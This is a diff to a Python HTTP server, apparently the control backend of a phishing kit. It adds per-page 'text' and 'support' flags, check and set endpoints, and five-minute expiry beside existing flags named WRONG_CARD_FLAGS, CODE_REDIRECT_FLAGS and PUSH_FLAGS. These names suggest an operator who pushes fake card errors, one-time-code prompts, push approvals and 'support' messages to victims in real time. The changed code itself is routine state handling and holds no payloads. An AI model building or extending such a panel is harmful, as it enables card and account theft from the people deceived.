@@ -81,10 +81,12 @@ WRONG_CARD_FLAGS = {}
 CODE_REDIRECT_FLAGS = {}
 # --- In-memory storage for custom texts ---
 CUSTOM_TEXTS = {}
-# --- In-memory storage for support flags ---
-SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
 # --- In-memory storage for push flags ---
 PUSH_FLAGS = {}
+# --- In-memory storage for text flags ---
+TEXT_FLAGS = {}
+# --- In-memory storage for support flags ---
+SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
 # Глобальные переменные для флагов
 USER_SESSIONS = {}  # ip: timestamp для отслеживания сессий
 # --- In-memory storage for ignoring first visit to new pages ---
@@ -109,13 +111,36 @@ def clear_old_flags():
     
     # Очищаем push флаги старше 5 минут
     expired_pages = []
-    for page_code, timestamp in PUSH_FLAGS.items():
-        if isinstance(timestamp, (int, float)) and current_time - timestamp > 300:
-            expired_pages.append(page_code)
+    for page_code, flag_data in PUSH_FLAGS.items():
+        if isinstance(flag_data, dict) and flag_data.get('timestamp'):
+            if current_time - flag_data['timestamp'] > 300:
+                expired_pages.append(page_code)
     
     for page_code in expired_pages:
         del PUSH_FLAGS[page_code]
         print(f"[clear_old_flags] Cleared expired push flag for page_code: {page_code}")
+    
+    # Очищаем text флаги старше 5 минут
+    expired_text_pages = []
+    for page_code, flag_data in TEXT_FLAGS.items():
+        if isinstance(flag_data, dict) and flag_data.get('timestamp'):
+            if current_time - flag_data['timestamp'] > 300:
+                expired_text_pages.append(page_code)
+    
+    for page_code in expired_text_pages:
+        del TEXT_FLAGS[page_code]
+        print(f"[clear_old_flags] Cleared expired text flag for page_code: {page_code}")
+    
+    # Очищаем support флаги старше 5 минут
+    expired_support_pages = []
+    for page_code, flag_data in SUPPORT_FLAGS.items():
+        if isinstance(flag_data, dict) and flag_data.get('timestamp'):
+            if current_time - flag_data['timestamp'] > 300:
+                expired_support_pages.append(page_code)
+    
+    for page_code in expired_support_pages:
+        del SUPPORT_FLAGS[page_code]
+        print(f"[clear_old_flags] Cleared expired support flag for page_code: {page_code}")
 
 # --- Додаю функцію для ігнорування першого переходу ---
 def add_ignore_first_visit(page_code):
@@ -515,6 +540,54 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b'false')
             return
+        if self.path.startswith('/check_text_flag'):
+            page_code = qs.get('page_code', [None])[0]
+            print(f'[check_text_flag] page_code: {page_code}, flag: {TEXT_FLAGS.get(page_code)}')
+            if page_code and page_code in TEXT_FLAGS:
+                flag_data = TEXT_FLAGS[page_code]
+                if isinstance(flag_data, dict) and not flag_data.get('used', True):
+                    # Помечаем как использованный
+                    TEXT_FLAGS[page_code] = {'used': True}
+                    print(f'[check_text_flag] Text flag used for page_code: {page_code}')
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'true')
+                else:
+                    # Удаляем использованный флаг
+                    del TEXT_FLAGS[page_code]
+                    print(f'[check_text_flag] Text flag cleared for page_code: {page_code}')
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'false')
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'false')
+            return
+        if self.path.startswith('/check_support_flag'):
+            page_code = qs.get('page_code', [None])[0]
+            print(f'[check_support_flag] page_code: {page_code}, flag: {SUPPORT_FLAGS.get(page_code)}')
+            if page_code and page_code in SUPPORT_FLAGS:
+                flag_data = SUPPORT_FLAGS[page_code]
+                if isinstance(flag_data, dict) and not flag_data.get('used', True):
+                    # Помечаем как использованный
+                    SUPPORT_FLAGS[page_code] = {'used': True}
+                    print(f'[check_support_flag] Support flag used for page_code: {page_code}')
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'true')
+                else:
+                    # Удаляем использованный флаг
+                    del SUPPORT_FLAGS[page_code]
+                    print(f'[check_support_flag] Support flag cleared for page_code: {page_code}')
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'false')
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'false')
+            return
         
         # --- API проксування до бекенду ---
         if self.path.startswith('/api/'):
@@ -838,34 +911,45 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b'error')
             return
+        elif self.path == '/set_text_flag':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                page_code = data.get('page_code')
+                text_id = data.get('text_id')
+                if page_code and text_id:
+                    TEXT_FLAGS[page_code] = {'text_id': text_id, 'used': False, 'timestamp': time.time()}
+                    print(f"[set_text_flag] Set text flag ONLY for page_code: {page_code} with text_id: {text_id}")
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'ok')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'no page_code or text_id')
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
         elif self.path == '/set_support_flag':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length)
             try:
                 data = json.loads(post_data)
-                ip = data.get('ip')
-                flag_type = data.get('type')  # 'support' або 'text'
-                text_id = data.get('text_id')
-                print(f"[set_support_flag] IP: {ip}, type: {flag_type}, text_id: {text_id}")
-                
-                # Очищаем старые флаги
-                clear_old_flags()
-                
-                # Очищаем ВСЕ старые флаги перед установкой нового
-                SUPPORT_FLAGS.clear()
-                print(f"[set_support_flag] Cleared all old support flags")
-                
-                if ip and flag_type == 'support':
-                    SUPPORT_FLAGS[ip] = {'support': True, 'used': False}
-                    print(f"[set_support_flag] Set support flag ONLY for IP: {ip}")
-                elif ip and flag_type == 'text' and text_id:
-                    SUPPORT_FLAGS[ip] = {'text_id': text_id, 'used': False}
-                    print(f"[set_support_flag] Set text flag ONLY for IP: {ip} with text_id: {text_id}")
-                self.send_response(200)
-                self.end_headers()
-                self.wfile.write(b'ok')
+                page_code = data.get('page_code')
+                if page_code:
+                    SUPPORT_FLAGS[page_code] = {'support': True, 'used': False, 'timestamp': time.time()}
+                    print(f"[set_support_flag] Set support flag ONLY for page_code: {page_code}")
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'ok')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'no page_code')
             except Exception as e:
-                print(f"[set_support_flag] Error: {e}")
                 self.send_response(500)
                 self.end_headers()
                 self.wfile.write(b'error')
@@ -930,7 +1014,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     PUSH_FLAGS.clear()
                     print(f'[set_push_flag] Cleared all old push flags')
                     
-                    PUSH_FLAGS[page_code] = {'used': False}
+                    PUSH_FLAGS[page_code] = {'used': False, 'timestamp': time.time()}
                     print(f'[set_push_flag] Set push flag ONLY for page_code: {page_code}')
                     self.send_response(200)
                     self.end_headers()
@@ -953,6 +1037,7 @@ if __name__ == "__main__":
     # Очищаем старые флаги при запуске
     SUPPORT_FLAGS.clear()
     PUSH_FLAGS.clear()
+    TEXT_FLAGS.clear()
     USER_SESSIONS.clear()
     CUSTOM_TEXTS.clear()
     print("🧹 Очищены старые флаги при запуске сервера")
